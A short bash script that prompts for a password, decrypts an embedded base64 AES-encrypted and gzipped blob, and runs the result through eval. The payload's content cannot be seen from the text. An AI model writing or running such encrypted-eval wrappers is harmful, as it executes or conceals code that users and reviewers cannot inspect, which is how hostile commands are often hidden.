#!/bin/bash
read -p "Please enter a password: " PASSWORD
eval "$(echo "U2FsdGVkX1/cDEDkYJnc5ihXinM9hw4Uuy0lYvbDQyOQSfR03gREL0c+9Hkqu3gj" | base64 -d | openssl enc -d -aes-256-cbc -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
